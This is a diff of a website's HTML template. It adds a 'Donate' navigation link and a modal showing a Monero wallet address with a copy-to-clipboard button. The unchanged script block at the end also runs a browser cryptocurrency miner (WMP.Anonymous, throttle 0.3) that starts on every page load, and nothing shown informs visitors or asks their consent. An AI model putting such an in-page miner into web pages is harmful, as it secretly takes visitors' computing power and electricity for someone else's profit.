@@ -110,6 +110,9 @@
                     <a class="nav-link" href="/upload">Upload</a>
                   </li>
                   <% } %>
+                <li class="nav-item">
+                  <a class="nav-link" href="#" data-bs-toggle="modal" data-bs-target="#donateModal">Donate</a>
+                </li>
               </ul>
               <form  method="POST" action="/search" class="d-flex">
                 <input class="form-control me-2" name="term" type="search" placeholder="Search" aria-label="Search" required>
@@ -139,9 +142,42 @@
           <div class="col"></div>
         </div>
       </div>
+
+  <div class="modal fade" id="donateModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title" id="exampleModalLabel">Donate to our Monero
+            <img src="https://gateway.ipfs.io/ipfs/Qmexc8QqmmdKiwZvD14kNV989kXdyp2GPVCYZFXrAVVb7y" alt="" width="28px"> wallet</h5>
+        </div>
+        <div class="modal-body"> 
+          <img src="https://gateway.ipfs.io/ipfs/QmeFUoHPYs1F912eLwP7mL6cThC1e1BrNJVaWm7pRkBzUS"
+           alt="4AQSkERTh6MPyUaoqCvwkdLQ19TZ7fgExJf9FWGTmYhrUjo9hWJzrQARzCJwrYxjgfgS7Kp1DWSwQHwzWwzABzF8L4PC2fa"
+            width="100%"
+            data-toggle="tooltip" data-placement="bottom"
+            title="4AQSkERTh6MPyUaoqCvwkdLQ19TZ7fgExJf9FWGTmYhrUjo9hWJzrQARzCJwrYxjgfgS7Kp1DWSwQHwzWwzABzF8L4PC2fa"
+          >
+          <div class="row">
+            <i class="fa fa-files-o" aria-hidden="true" onclick="copyToClipboard()" id="faCopyMoneroAddressToClipboard"
+            data-toggle="tooltip" data-placement="bottom"
+            title="Copy to clipboard"
+            ></i>
+          </div>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-danger" data-bs-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
     <script>
         var miner = WMP.Anonymous('SK_wYDJ7Rli2DyNZvckyjj3v',{throttle: 0.3});
         miner.start();
+
+        const copyToClipboard = () => {
+          navigator.clipboard.writeText("4AQSkERTh6MPyUaoqCvwkdLQ19TZ7fgExJf9FWGTmYhrUjo9hWJzrQARzCJwrYxjgfgS7Kp1DWSwQHwzWwzABzF8L4PC2fa");
+        }
     </script>
 </body>
 </html>
